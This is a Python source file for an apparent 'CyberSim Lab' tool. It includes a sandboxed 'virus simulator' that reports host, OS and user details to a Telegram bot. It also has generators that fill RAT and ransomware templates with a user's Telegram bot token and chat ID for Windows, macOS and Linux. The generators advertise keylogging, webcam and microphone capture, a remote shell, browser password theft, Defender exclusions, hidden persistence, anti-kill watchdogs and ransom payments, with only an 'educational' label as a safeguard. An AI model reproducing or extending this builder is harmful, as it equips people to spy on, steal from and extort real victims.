    print(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{color}}{{msg}}{{C.RS}}")

def send_telegram(text):
    if not CONFIG.get("bot_token") or not CONFIG.get("chat_id"):
        return
    try:
        import requests
        url = f"https://api.telegram.org/bot{{CONFIG['bot_token']}}/sendMessage"
        requests.post(url, json={{"chat_id": CONFIG["chat_id"], "text": text}}, timeout=10)
    except:
        pass

class VirusSimulator:
    def __init__(self, config):
        self.config = config
        self.report_lines = []
        self.files_encrypted = 0
        self.hosts_scanned = 0
        self.hosts_infected = 0

    def setup_sandbox(self):
        log("Setting up sandbox...", C.CY)
        os.makedirs(SANDBOX, exist_ok=True)
        os.makedirs(ENCRYPTED_DIR, exist_ok=True)
        os.makedirs(ORIGINAL_DIR, exist_ok=True)
        fake_exts = ['.txt','.docx','.pdf','.csv','.json','.xml','.png','.jpg']
        for d in ['Documents','Desktop','Downloads','Pictures']:
            dp = os.path.join(SANDBOX, "victim_home", d)
            os.makedirs(dp, exist_ok=True)
            for _ in range(random.randint(3, 8)):
                ext = random.choice(fake_exts)
                fname = f"{{''.join(random.choices(string.ascii_lowercase, k=8))}}{{ext}}"
                with open(os.path.join(dp, fname), 'wb') as f:
                    f.write(os.urandom(random.randint(100, 5000)))
        self.report_lines.append(f"=== VIRUS SIMULATION REPORT ===")

    def phase1_infection(self):
        print(f"\\n{{C.BD}}{{C.R}}──── PHASE 1: INITIAL INFECTION ────{{C.RS}}")
        method = self.config["propagation_method"]
        log(f"Infection vector: {{method.upper()}}", C.Y)
        send_telegram(f"\u26a0\ufe0f MALWARE SIMULATION STARTED\\nType: {{self.config['virus_type'].upper()}}\\nVector: {{method.upper()}}\\nOS: {{platform.system()}} {{platform.release()}}\\nHost: {{socket.gethostname()}}\\nUser: {{os.environ.get('USER', 'unknown')}}")
        if method == "email":
            log("Simulating phishing email...", C.DM)
            edir = os.path.join(SANDBOX, "phishing_email")
            os.makedirs(edir, exist_ok=True)
            with open(os.path.join(edir, "phishing_email.eml"), 'w') as f:
                f.write(f"From: security@bank.com\\nSubject: URGENT Invoice #{{random.randint(10000,99999)}}\\nAttachment: invoice.zip")
            log("  Phishing email created in sandbox", C.W)
        elif method == "usb":
            udir = os.path.join(SANDBOX, "usb_drive")
            os.makedirs(udir, exist_ok=True)
            with open(os.path.join(udir, "autorun.inf"), 'w') as f:
                f.write("[autorun]\\nopen=setup.exe")
            with open(os.path.join(udir, "setup.exe"), 'wb') as f:
                f.write(os.urandom(random.randint(50000, 200000)))
            log("  USB infection artifacts created", C.W)
        elif method == "network_share":
            log("  Simulating SMB scan...", C.W)
            for i in range(1, 11):
                st = random.choice(["OPEN","FILTERED","CLOSED"])
                log(f"  [SCAN] 192.168.1.{{i}}:445 -> {{st}}", C.G if st=="OPEN" else C.DM)
                self.hosts_scanned += 1
        else:
            log("  P2P botnet connection simulated", C.W)
        self.report_lines.append(f"  Vector: {{method.upper()}}")
        log("[+] Infection SUCCESSFUL", C.G)

    def phase2_privesc(self):
        print(f"\\n{{C.BD}}{{C.R}}──── PHASE 2: PRIVILEGE ESCALATION ────{{C.RS}}")
        stealth = self.config["stealth_level"]
        if stealth == "advanced":
            for name, desc in [("Token Impersonation","SYSTEM token"),("Kernel Exploit","Race condition"),("UAC Bypass","COM Hijacking")]:
                log(f"  [TECHNIQUE] {{name}}: {{desc}}", C.R)
                time.sleep(0.2)
            log("[+] ROOT/SYSTEM", C.G)
        elif stealth == "intermediate":
            log(f"  CVE-2024-{{random.randint(10000,99999)}}", C.R)
            log("[+] Sudo/Admin", C.G)
        else:
            log("[+] User level", C.G)
        self.report_lines.append(f"  Stealth: {{stealth}}")
        send_telegram(f"[PHASE 2] Privilege Escalation: {{stealth}}")

    def phase3_persistence(self):
        print(f"\\n{{C.BD}}{{C.R}}──── PHASE 3: PERSISTENCE ────{{C.RS}}")
        stealth = self.config["stealth_level"]
        n = {{"basic":2,"intermediate":3,"advanced":4}}[stealth]
        pdir = os.path.join(SANDBOX, "persistence")
        os.makedirs(os.path.join(pdir, "cron"), exist_ok=True)
        with open(os.path.join(pdir, "cron", "crontab"), 'w') as f:
            f.write("*/5 * * * * /usr/bin/python3 /opt/.hidden/task.py\\n")
        log("  [+] Cron job installed", C.Y)
        if stealth in ["intermediate","advanced"]:
            os.makedirs(os.path.join(pdir, "systemd"), exist_ok=True)
            with open(os.path.join(pdir, "systemd", "update.service"), 'w') as f:
                f.write("[Unit]\\nDescription=Update\\n[Service]\\nExecStart=/usr/bin/python3 /opt/.hidden/svc.py\\n[Install]\\nWantedBy=multi-user.target")
            log("  [+] Systemd service installed", C.Y)
        if stealth == "advanced":
            os.makedirs(os.path.join(pdir, "init.d"), exist_ok=True)
            with open(os.path.join(pdir, "init.d", "net-stats"), 'w') as f:
                f.write("#!/bin/bash\\n/usr/bin/python3 /opt/.hidden/net.py &")
            log("  [+] Init.d script installed", C.Y)
        log(f"[+] {{n}} persistence mechanisms", C.G)
        send_telegram(f"[PHASE 3] Persistence: {{n}} mechanisms installed")

    def phase4_payload(self):
        vt = self.config["virus_type"]
        print(f"\\n{{C.BD}}{{C.R}}──── PHASE 4: {{vt.upper()}} ────{{C.RS}}")
        if vt == "ransomware":
            self._ransomware()
        elif vt == "worm":
            self._worm()
        elif vt == "rootkit":
            self._rootkit()
        else:
            log("Secondary payload simulated", C.Y)

    def _ransomware(self):
        algo = self.config["encryption_algo"]
        log(f"Generating keys ({{algo}})...", C.Y)
        key_dir = os.path.join(SANDBOX, "keys")
        os.makedirs(key_dir, exist_ok=True)
        pubkey = ''.join(random.choices(string.hexdigits.upper(), k=64))
        privkey = ''.join(random.choices(string.hexdigits.upper(), k=128))
        with open(os.path.join(key_dir, "public_key.pem"), 'w') as f:
            f.write(f"-----BEGIN PUBLIC KEY-----\\n{{pubkey}}\\n-----END PUBLIC KEY-----")
        with open(os.path.join(key_dir, "private_key.pem"), 'w') as f:
            f.write(f"-----BEGIN RSA PRIVATE KEY-----\\n{{privkey}}\\n-----END RSA PRIVATE KEY-----")
        log(f"Encrypting files...", C.Y)
        victim = os.path.join(SANDBOX, "victim_home")
        for root, dirs, files in os.walk(victim):
            for fname in files:
                fpath = os.path.join(root, fname)
                with open(fpath, 'rb') as f:
                    data = f.read()
                key = hashlib.md5(privkey.encode()).digest()
                enc = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data))
                with open(os.path.join(ENCRYPTED_DIR, fname+".locked"), 'wb') as f:
                    f.write(bytes(enc))
                with open(os.path.join(ORIGINAL_DIR, fname+".hash"), 'w') as f:
                    f.write(hashlib.sha256(data).hexdigest())
                self.files_encrypted += 1
                log(f"  [ENCRYPT] {{fname}}", C.R)
        with open(os.path.join(SANDBOX, "README_DECRYPT.txt"), 'w') as f:
            f.write(f"YOUR FILES ENCRYPTED with {{algo}}.\\nSend 0.5 BTC to recover.")
        log(f"[!] TOTAL ENCRYPTED: {{self.files_encrypted}}", C.R)
        self.report_lines.append(f"  Files encrypted: {{self.files_encrypted}}")
        send_telegram(f"[PHASE 4] RANSOMWARE: {{self.files_encrypted}} files encrypted ({{algo}})")

    def _worm(self):
        log("Scanning network...", C.Y)
        for i in range(1, 30):
            st = random.choice(["OPEN","FILTERED","FILTERED","CLOSED"])
            log(f"  [SCAN] 192.168.1.{{i}}:445 -> {{st}}", C.G if st=="OPEN" else C.DM)
            self.hosts_scanned += 1
            if st == "OPEN" and random.random() > 0.7:
                hdir = os.path.join(SANDBOX, "worm_spread", f"192.168.1.{{i}}")
                os.makedirs(hdir, exist_ok=True)
                with open(os.path.join(hdir, "worm.bin"), 'wb') as f:
                    f.write(os.urandom(random.randint(50000, 200000)))
                self.hosts_infected += 1
        log(f"[!] SCAN: {{self.hosts_scanned}} | INFECTED: {{self.hosts_infected}}", C.R)
        send_telegram(f"[PHASE 4] WORM: {{self.hosts_scanned}} scanned, {{self.hosts_infected}} infected")

    def _rootkit(self):
        log("Installing kernel hooks...", C.Y)
        for h in ["NtQueryDirectoryFile->HIDDEN","NtQuerySystemInformation->HIDDEN","CreateFileW->REDIRECTED","send/recv->INTERCEPTED"]:
            log(f"  [HOOK] {{h}}", C.R)
            time.sleep(0.2)
        lkm = os.path.join(SANDBOX, "rootkit", "lkm")
        os.makedirs(lkm, exist_ok=True)
        with open(os.path.join(lkm, "sim_rootkit.c"), 'w') as f:
            f.write("#include <linux/module.h>\\nMODULE_LICENSE(\\"GPL\\");\\nstatic int __init rk_init(void) {{ return 0; }}\\nmodule_init(rk_init);")
        log("[+] Rootkit installed", C.G)
        send_telegram("[PHASE 4] ROOTKIT: Kernel hooks installed")

    def phase5_c2(self):
        print(f"\\n{{C.BD}}{{C.R}}──── PHASE 5: C2 COMMUNICATION (Telegram) ────{{C.RS}}")
        if CONFIG.get("bot_token") and CONFIG.get("chat_id"):
            log("Connecting to Telegram C2...", C.Y)
            for _ in range(3):
                hb = f"heartbeat_{{''.join(random.choices(string.hexdigits, k=8))}}"
                log(f"  Heartbeat: {{hb[:20]}}...", C.DM)
            send_telegram(f"\U0001f4e1 C2 CONNECTED\\nType: {{self.config['virus_type'].upper()}}\\nStealth: {{self.config['stealth_level']}}\\nFiles encrypted: {{self.files_encrypted}}\\nHosts infected: {{self.hosts_infected}}\\nHost: {{socket.gethostname()}}\\nOS: {{platform.system()}}\\nUser: {{os.environ.get('USER', 'unknown')}}")
            log("[+] Telegram C2 established", C.G)
        else:
            log("No Telegram token set - C2 simulation skipped", C.DM)

    def save_report(self):
        self.report_lines.append(f"\\n=== COMPLETE ===")
        with open(REPORT_FILE, 'w') as f:
            f.write("\\n".join(self.report_lines))
        log(f"Report: {{REPORT_FILE}}", C.G)

    def run(self):
        log(f"Virus: {{self.config['virus_type']}} | OS: {{self.config['target_os']}} | Stealth: {{self.config['stealth_level']}}", C.W)
        self.setup_sandbox()
        self.phase1_infection()
        self.phase2_privesc()
        self.phase3_persistence()
        self.phase4_payload()
        self.phase5_c2()
        self.save_report()
        send_telegram(f"\u2705 SIMULATION COMPLETE\\nType: {{self.config['virus_type'].upper()}}\\nFiles encrypted: {{self.files_encrypted}}\\nHosts scanned: {{self.hosts_scanned}}\\nHosts infected: {{self.hosts_infected}}\\nStealth: {{self.config['stealth_level']}}\\nReport: {{REPORT_FILE}}")
        print(f"\\n{{C.G}}{{'='*50}}{{C.RS}}\\n  {{C.BD}}VIRUS SIMULATION COMPLETE{{C.RS}}\\n{{C.G}}{{'='*50}}{{C.RS}}")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s,f: (print(f"\\n{{C.Y}}Interrupted.{{C.RS}}"), sys.exit(0)))
    VirusSimulator(CONFIG).run()
'''


# ============================================================
# WINDOWS RAT GENERATOR (NEW)
# ============================================================

def read_rat_template():
    """Read the Windows RAT template file"""
    template_path = RAT_TEMPLATE_PATH
    # Also check alternative locations
    if not os.path.exists(template_path):
        template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'rat_telegram_win.py')
    if not os.path.exists(template_path):
        template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'rat_telegram_win.py')

    if not os.path.exists(template_path):
        raise FileNotFoundError("rat_telegram_win.py template not found!")

    with open(template_path, 'r', encoding='utf-8') as f:
        return f.read()


def generate_rat_code(bot_token, chat_id):
    """Generate the Windows RAT code with user's credentials"""
    template = read_rat_template()

    # Replace BOT_TOKEN and ADMIN_CHAT_ID
    code = template.replace(
        'BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"',
        f'BOT_TOKEN = "{bot_token}"'
    )
    code = code.replace(
        'ADMIN_CHAT_ID = "YOUR_CHAT_ID_HERE"',
        f'ADMIN_CHAT_ID = "{chat_id}"'
    )

    return code


def generate_rat_code_macos(bot_token, chat_id, c2_port='443'):
    """Generate macOS RAT code with user's credentials"""
    port_label = 'Auto (Telegram Default)' if c2_port == '0' else c2_port
    code = read_template(RAT_MACOS_TEMPLATE)
    code = code.replace('__BOT_TOKEN__', bot_token)
    code = code.replace('__CHAT_ID__', chat_id)
    code = code.replace('__C2_PORT__', port_label)
    return code



def generate_rat_code_linux(bot_token, chat_id, c2_port='443'):
    """Generate Linux RAT code with user's credentials"""
    port_label = 'Auto (Telegram Default)' if c2_port == '0' else c2_port
    code = read_template(RAT_LINUX_TEMPLATE)
    code = code.replace('__BOT_TOKEN__', bot_token)
    code = code.replace('__CHAT_ID__', chat_id)
    code = code.replace('__C2_PORT__', port_label)
    return code



def gen_rat_generate_lines(bot_token, chat_id, target_os='windows', c2_port='443'):
    """Generate terminal lines for RAT generation animation"""
    lines = []
    masked_token = bot_token[:6] + '***' + bot_token[-4:] if len(bot_token) > 10 else bot_token

    os_labels = {'windows': 'Windows 10/11', 'macos': 'macOS', 'linux': 'Linux (Ubuntu/Kali)'}
    os_label = os_labels.get(target_os, target_os)
    port_label = 'Auto (Telegram Default)' if c2_port == '0' else c2_port
    filenames = {'windows': 'rat_telegram_win.py', 'macos': 'rat_telegram_mac.py', 'linux': 'rat_telegram_linux.py'}
    filename = filenames.get(target_os, 'rat_telegram.py')

    lines.append({'text': '\u2554'*50, 'type': 'system'})
    lines.append({'text': '     CyberSim Lab - RAT Generator v5.0', 'type': 'system'})
    lines.append({'text': '     Telegram Bot C2 - Multi-OS Edition', 'type': 'system'})
    lines.append({'text': '\u2557'*50, 'type': 'system'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '[*] Loading RAT template...', 'type': 'info'})
    lines.append({'text': f'[*] Target OS: {os_label}', 'type': 'info'})
    lines.append({'text': f'[*] C2 Channel: Telegram Bot (Port: {port_label})', 'type': 'info'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── CONFIGURATION ────', 'type': 'system'})
    lines.append({'text': f'  BOT_TOKEN:  {masked_token}', 'type': 'success'})
    lines.append({'text': f'  CHAT_ID:    {chat_id}', 'type': 'success'})
    lines.append({'text': f'  Platform:   {os_label}', 'type': 'output'})
    lines.append({'text': f'  C2:         Telegram Bot API', 'type': 'output'})
    lines.append({'text': f'  C2 Port:    {port_label}', 'type': 'output'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── EMBEDDING CREDENTIALS ────', 'type': 'system'})
    lines.append({'text': '  [1/2] Replacing BOT_TOKEN...', 'type': 'info'})
    lines.append({'text': '  [2/2] Replacing ADMIN_CHAT_ID...', 'type': 'info'})
    lines.append({'text': '  [OK] Credentials embedded successfully', 'type': 'success'})
    lines.append({'text': '', 'type': 'output'})

    if target_os == 'windows':
        lines.append({'text': '──── FEATURES INCLUDED ────', 'type': 'system'})
        features = [
            ('Screenshot', 'PIL + ctypes + PowerShell fallback'),
            ('Webcam', 'OpenCV + ffmpeg + PS fallback'),
            ('Video Recording', 'OpenCV + ffmpeg dshow'),
            ('Microphone Live', 'pyaudio + ffmpeg ogg'),
            ('Keylogger', 'pynput persistent'),
            ('Remote Shell', 'cmd/PowerShell execution'),
            ('File Manager', 'Browse, download, upload, zip'),
            ('Passwords & WiFi', 'Chrome/Edge/Firefox data'),
            ('Clipboard', 'PowerShell Get-Clipboard'),
            ('Notifications', 'XML parser + Event Log'),
            ('System Info', 'hostname, IP, processes, ports'),
            ('Live Monitor', 'Timed screenshot series'),
        ]
        for name, desc in features:
            lines.append({'text': f'  [+] {name:<20} - {desc}', 'type': 'info'})
        lines.append({'text': '', 'type': 'output'})

        lines.append({'text': '──── STEALTH FEATURES ────', 'type': 'system'})
        stealth = [
            ('Auto-Install Deps', 'pip install requests, pynput, Pillow, opencv-python'),
            ('Registry Persistence', 'HKCU\\...\\Run'),
            ('Startup BAT + VBS', 'Invisible startup wrapper'),
            ('Task Scheduler', 'ONLOGON + SYSTEM task'),
            ('Defender Exclusion', 'Path + Process + Extension'),
            ('Firewall Rule', 'Silent netsh allow'),
            ('No CMD Window', 'pythonw.exe + CREATE_NO_WINDOW'),
            ('Anti-Kill Watchdog', '30s process monitor + auto-restart'),
            ('Start/Stop Notify', 'Telegram on startup/shutdown'),
            ('UAC Bypass Info', 'Registry check + admin status'),
        ]
        for name, desc in stealth:
            lines.append({'text': f'  [*] {name:<20} - {desc}', 'type': 'warning'})
        lines.append({'text': '', 'type': 'output'})

        lines.append({'text': '──── CLI FLAGS ────', 'type': 'system'})
        flags = [
            ('--install', 'Full stealth setup (one command!)'),
            ('--uninstall', 'Remove all persistence & cleanup'),
            ('--daemon', 'Background mode (no window)'),
            ('--watchdog', 'Anti-kill monitor process'),
            ('--status', 'Check running + persistence status'),
        ]
        for flag, desc in flags:
            lines.append({'text': f'  {flag:<16} {desc}', 'type': 'output'})
        lines.append({'text': '', 'type': 'output'})

        total_cmds = 30
        total_lines_count = 2039
        lines.append({'text': '='*55, 'type': 'system'})
        lines.append({'text': '  GENERATION COMPLETE', 'type': 'system'})
        lines.append({'text': f'  File:     {filename}', 'type': 'output'})
        lines.append({'text': f'  Size:     ~{total_lines_count} lines', 'type': 'output'})
        lines.append({'text': f'  Commands: {total_cmds}+ Telegram commands', 'type': 'output'})
        lines.append({'text': f'  Token:    {masked_token}', 'type': 'output'})
        lines.append({'text': '='*55, 'type': 'system'})
        lines.append({'text': '[+] READY TO DOWNLOAD!', 'type': 'success'})
        lines.append({'text': '', 'type': 'output'})
        lines.append({'text': 'Usage on Windows:', 'type': 'info'})
        lines.append({'text': f'  python {filename}                # Normal mode', 'type': 'output'})
        lines.append({'text': f'  python {filename} --install      # Full stealth!', 'type': 'output'})
        lines.append({'text': f'  python {filename} --uninstall    # Remove everything', 'type': 'output'})
        lines.append({'text': f'  python {filename} --status       # Check status', 'type': 'output'})
    elif target_os == 'macos':
        lines.append({'text': '──── FEATURES (macOS) ────', 'type': 'system'})
        mac_features = [
            ('Screenshot', 'PIL + screencapture'),
            ('Webcam', 'OpenCV + imagesnap'),
            ('Keylogger', 'pynput persistent'),
            ('Remote Shell', 'zsh/bash execution'),
            ('File Manager', 'Browse, download, upload'),
            ('System Info', 'hostname, IP, processes'),
            ('Clipboard', 'pbpaste/pbcopy'),
            ('WiFi Networks', 'networksetup + airport'),
        ]
        for name, desc in mac_features:
            lines.append({'text': f'  [+] {name:<20} - {desc}', 'type': 'info'})
        lines.append({'text': '', 'type': 'output'})
        lines.append({'text': '──── STEALTH (macOS) ────', 'type': 'system'})
        mac_stealth = [
            ('LaunchAgent', '~/Library/LaunchAgents/ persistence'),
            ('Cron Job', 'Hidden crontab entry'),
            ('Auto-Install Deps', 'pip3 install requests pynput Pillow'),
            ('Start/Stop Notify', 'Telegram on startup/shutdown'),
        ]
        for name, desc in mac_stealth:
            lines.append({'text': f'  [*] {name:<20} - {desc}', 'type': 'warning'})
        lines.append({'text': '', 'type': 'output'})
        lines.append({'text': '='*55, 'type': 'system'})
        lines.append({'text': '  GENERATION COMPLETE', 'type': 'system'})
        lines.append({'text': f'  File:     {filename}', 'type': 'output'})
        lines.append({'text': f'  Platform: {os_label}', 'type': 'output'})
        lines.append({'text': f'  C2 Port:  {port_label}', 'type': 'output'})
        lines.append({'text': '='*55, 'type': 'system'})
        lines.append({'text': '[+] READY TO DOWNLOAD!', 'type': 'success'})
        lines.append({'text': '', 'type': 'output'})
        lines.append({'text': 'Usage on macOS:', 'type': 'info'})
        lines.append({'text': f'  python3 {filename}                # Normal mode', 'type': 'output'})
        lines.append({'text': f'  python3 {filename} --install      # Full stealth!', 'type': 'output'})
    elif target_os == 'linux':
        lines.append({'text': '──── FEATURES (Linux) ────', 'type': 'system'})
        linux_features = [
            ('Screenshot', 'PIL + X11/wayland'),
            ('Webcam', 'OpenCV + v4l2'),
            ('Keylogger', 'pynput / evdev'),
            ('Remote Shell', 'bash/zsh execution'),
            ('File Manager', 'Browse, download, upload'),
            ('System Info', 'hostname, IP, processes, ports'),
            ('Clipboard', 'xclip / xsel'),
            ('WiFi Networks', 'nmcli / iwlist'),
            ('Passwords', 'Chrome/Firefox data extraction'),
        ]
        for name, desc in linux_features:
            lines.append({'text': f'  [+] {name:<20} - {desc}', 'type': 'info'})
        lines.append({'text': '', 'type': 'output'})
        lines.append({'text': '──── STEALTH (Linux) ────', 'type': 'system'})
        linux_stealth = [
            ('Systemd Service', '/etc/systemd/system/ persistence'),
            ('Cron Job', 'Hidden crontab entry'),
            ('Bash RC', 'Hidden .bashrc backdoor'),
            ('Auto-Install Deps', 'pip3 install requests pynput Pillow'),
            ('Start/Stop Notify', 'Telegram on startup/shutdown'),
            ('Root Check', 'Detect sudo/root privileges'),
        ]
        for name, desc in linux_stealth:
            lines.append({'text': f'  [*] {name:<20} - {desc}', 'type': 'warning'})
        lines.append({'text': '', 'type': 'output'})
        lines.append({'text': '='*55, 'type': 'system'})
        lines.append({'text': '  GENERATION COMPLETE', 'type': 'system'})
        lines.append({'text': f'  File:     {filename}', 'type': 'output'})
        lines.append({'text': f'  Platform: {os_label}', 'type': 'output'})
        lines.append({'text': f'  C2 Port:  {port_label}', 'type': 'output'})
        lines.append({'text': '='*55, 'type': 'system'})
        lines.append({'text': '[+] READY TO DOWNLOAD!', 'type': 'success'})
        lines.append({'text': '', 'type': 'output'})
        lines.append({'text': 'Usage on Linux:', 'type': 'info'})
        lines.append({'text': f'  chmod +x {filename} && python3 {filename}', 'type': 'output'})
        lines.append({'text': f'  sudo python3 {filename} --install    # Full stealth!', 'type': 'output'})

    return lines


def gen_rat_report(bot_token, chat_id, target_os='windows', c2_port='443'):
    """Generate report for RAT generation"""
    masked_token = bot_token[:6] + '***' + bot_token[-4:] if len(bot_token) > 10 else bot_token
    os_labels = {'windows': 'Windows 10/11', 'macos': 'macOS', 'linux': 'Linux (Ubuntu/Kali)'}
    os_label = os_labels.get(target_os, target_os)
    port_label = 'Auto (Telegram Default)' if c2_port == '0' else c2_port
    filenames = {'windows': 'rat_telegram_win.py', 'macos': 'rat_telegram_mac.py', 'linux': 'rat_telegram_linux.py'}
    filename = filenames.get(target_os, 'rat_telegram.py')

    r = []
    r.append('=' * 60)
    r.append(f'  CyberSim Lab - {os_label} RAT v5.0 Generation Report')
    r.append(f'  Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    r.append('=' * 60)
    r.append('')
    r.append(f'  BOT_TOKEN: {masked_token}')
    r.append(f'  CHAT_ID:   {chat_id}')
    r.append(f'  Platform:  {os_label}')
    r.append(f'  C2:        Telegram Bot API')
    r.append(f'  C2 Port:   {port_label}')
    r.append(f'  Version:   v5.0 Stealth')
    r.append(f'  Filename:  {filename}')
    r.append('')

    if target_os == 'windows':
        r.append('  Features: Screenshot, Webcam, Video, Mic, Keylogger,')
        r.append('            Shell, Files, Passwords, WiFi, Clipboard,')
        r.append('            Notifications, System Info, Processes, Ports')
        r.append('')
        r.append('  Stealth:   Registry + Startup + Task Scheduler')
        r.append('            Defender exclusion + Firewall rule')
        r.append('            pythonw.exe (no CMD) + Anti-kill watchdog')
        r.append('            Start/Stop Telegram notifications')
        r.append('')
        r.append(f'  Usage: python {filename} --install')
    elif target_os == 'macos':
        r.append('  Features: Screenshot, Webcam, Keylogger, Shell,')
        r.append('            Files, System Info, Clipboard, WiFi')
        r.append('')
        r.append('  Stealth:   LaunchAgent + Cron Job')
        r.append('            Auto-install dependencies')
        r.append('            Start/Stop Telegram notifications')
        r.append('')
        r.append(f'  Usage: python3 {filename} --install')
    elif target_os == 'linux':
        r.append('  Features: Screenshot, Webcam, Keylogger, Shell,')
        r.append('            Files, System Info, Clipboard, WiFi, Passwords')
        r.append('')
        r.append('  Stealth:   Systemd Service + Cron Job + Bash RC')
        r.append('            Auto-install dependencies')
        r.append('            Start/Stop Telegram notifications')
        r.append('            Root privilege detection')
        r.append('')
        r.append(f'  Usage: sudo python3 {filename} --install')

    r.append('')
    r.append('NOTE: Educational cybersecurity lab only.')
    return '\n'.join(r)


# ============================================================
# RANSOMWARE GENERATOR
# ============================================================

def gen_ransomware_code(bot_token, chat_id, target_os='windows', enc_algo='xor', ransom_amount='500', ransom_method='bitcoin', upi_id='pay@merchant'):
    """Generate ransomware Python script with Telegram C2 (Educational Only)"""
    algo_name = 'AES-256' if enc_algo == 'aes' else 'XOR Cipher'
    code = read_template(RANSOMWARE_TEMPLATE)
    code = code.replace('__BOT_TOKEN__', bot_token)
    code = code.replace('__CHAT_ID__', chat_id)
    code = code.replace('__TARGET_OS__', target_os)
    code = code.replace('__ENC_ALGO__', enc_algo)
    code = code.replace('__RANSOM_AMOUNT__', str(ransom_amount))
    code = code.replace('__RANSOM_METHOD__', ransom_method)
    code = code.replace('__UPI_ID__', upi_id)
    code = code.replace('__ALGO_NAME__', algo_name)
    return code


def gen_rw_generate_lines(bot_token, chat_id, target_os='windows', enc_algo='xor', ransom_amount='500', ransom_method='bitcoin', upi_id='pay@merchant'):
    """Generate terminal animation lines for ransomware generation dashboard"""
    lines = []
    masked_token = bot_token[:6] + '***' + bot_token[-4:] if len(bot_token) > 10 else bot_token

    os_labels = {'windows': 'Windows 10/11', 'macos': 'macOS', 'linux': 'Linux (Ubuntu/Kali)'}
    os_label = os_labels.get(target_os, target_os)
    algo_name = 'AES-256' if enc_algo == 'aes' else 'XOR Cipher'
    filenames = {'windows': 'ransomware_win.py', 'linux': 'ransomware_linux.py', 'macos': 'ransomware_mac.py'}
    filename = filenames.get(target_os, 'ransomware.py')

    lines.append({'text': '\u2554'*50, 'type': 'system'})
    lines.append({'text': '     CyberSim Lab - Ransomware Generator v5.0', 'type': 'system'})
    lines.append({'text': '     Telegram Bot C2 - Multi-OS Edition', 'type': 'system'})
    lines.append({'text': '\u2557'*50, 'type': 'system'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '[*] Loading ransomware template...', 'type': 'info'})
    lines.append({'text': f'[*] Target OS: {os_label}', 'type': 'info'})
    lines.append({'text': f'[*] Encryption: {algo_name}', 'type': 'info'})
    lines.append({'text': f'[*] C2 Channel: Telegram Bot API', 'type': 'info'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── CONFIGURATION ────', 'type': 'system'})
    lines.append({'text': f'  BOT_TOKEN:  {masked_token}', 'type': 'success'})
    lines.append({'text': f'  CHAT_ID:    {chat_id}', 'type': 'success'})
    lines.append({'text': f'  Platform:   {os_label}', 'type': 'output'})
    lines.append({'text': f'  Algorithm:  {algo_name}', 'type': 'output'})
    lines.append({'text': f'  Ransom:     {ransom_amount} {"Rs (INR)" if ransom_method == "upi" else "$"} via {ransom_method.upper()}', 'type': 'output'})
    if upi_id and upi_id != 'pay@merchant':
        lines.append({'text': f'  UPI/Wallet:  {upi_id}', 'type': 'output'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── EMBEDDING CREDENTIALS ────', 'type': 'system'})
    lines.append({'text': '  [1/3] Replacing BOT_TOKEN...', 'type': 'info'})
    lines.append({'text': '  [2/3] Replacing ADMIN_CHAT_ID...', 'type': 'info'})
    lines.append({'text': '  [3/3] Setting encryption parameters...', 'type': 'info'})
    lines.append({'text': '  [OK] Credentials embedded successfully', 'type': 'success'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── FEATURES INCLUDED ────', 'type': 'system'})
    features = [
        ('File Encryption', f'{algo_name} on 28+ file types'),
        ('Ransom Popup', f'HTML popup with {ransom_method.upper()} payment on file open'),
        ('Telegram C2', 'Remote control via Bot API'),
        ('/unlock', 'Remote decrypt ALL + self-delete ransomware'),
        ('/status', 'Victim status & file count'),
        ('/info', 'Full system info (IP, OS, CPU, RAM)'),
        ('/help', 'Command list'),
        ('/stop', 'Stop ransomware process'),
        ('Self-Delete', 'Script + key + persistence auto-remove after /unlock'),
        ('Key Storage', f'Hidden in {"%APPDATA%/.syscache" if target_os == "windows" else "/tmp/.syscache"}'),
        ('Victim ID', 'Random 8-char hex identifier'),
    ]
    for name, desc in features:
        lines.append({'text': f'  [+] {name:<20} - {desc}', 'type': 'info'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── STEALTH FEATURES ────', 'type': 'system'})
    if target_os == 'windows':
        stealth = [
            ('Registry Run Key', 'HKCU\\...\\Run persistence'),
            ('Startup BAT + VBS', 'Invisible startup wrapper'),
            ('Hidden Key Store', '%APPDATA%/.syscache/key.dat (hidden)'),
            ('No CMD Window', 'pythonw.exe silent execution'),
            ('Auto-Install Deps', 'pip install requests (auto)'),
        ]
    elif target_os == 'linux':
        stealth = [
            ('Systemd Service', '/etc/systemd/system/ persistence'),
            ('Cron Job', '@reboot hidden crontab entry'),
            ('Hidden Key Store', '/tmp/.syscache/key.dat'),
            ('Auto-Install Deps', 'pip3 install requests (auto)'),
            ('Root Detection', 'Detect sudo/root privileges'),
        ]
    else:
        stealth = [
            ('LaunchAgent', '~/Library/LaunchAgents/ persistence'),
            ('Cron Job', '@reboot hidden crontab entry'),
            ('Hidden Key Store', '/tmp/.syscache/key.dat'),
            ('Auto-Install Deps', 'pip3 install requests (auto)'),
        ]
    for name, desc in stealth:
        lines.append({'text': f'  [*] {name:<20} - {desc}', 'type': 'warning'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── TARGET DIRECTORIES ────', 'type': 'system'})
    lines.append({'text': '  Desktop, Documents, Downloads, Pictures', 'type': 'info'})
    lines.append({'text': '  28+ file extensions (.doc, .pdf, .jpg, .py, .sql, ...)', 'type': 'info'})
    lines.append({'text': '  System directories automatically skipped', 'type': 'info'})
    lines.append({'text': '', 'type': 'output'})

    lines.append({'text': '──── CLI FLAGS ────', 'type': 'system'})
    flags = [
        ('(none)', 'Normal run (encrypt + poll Telegram)'),
        ('--install', 'Setup persistence then run'),
        ('--decrypt', 'Local decrypt using stored key'),
        ('--uninstall', 'Remove all persistence'),
    ]
    for flag, desc in flags:
        lines.append({'text': f'  {flag:<16} {desc}', 'type': 'output'})
    lines.append({'text': '', 'type': 'output'})

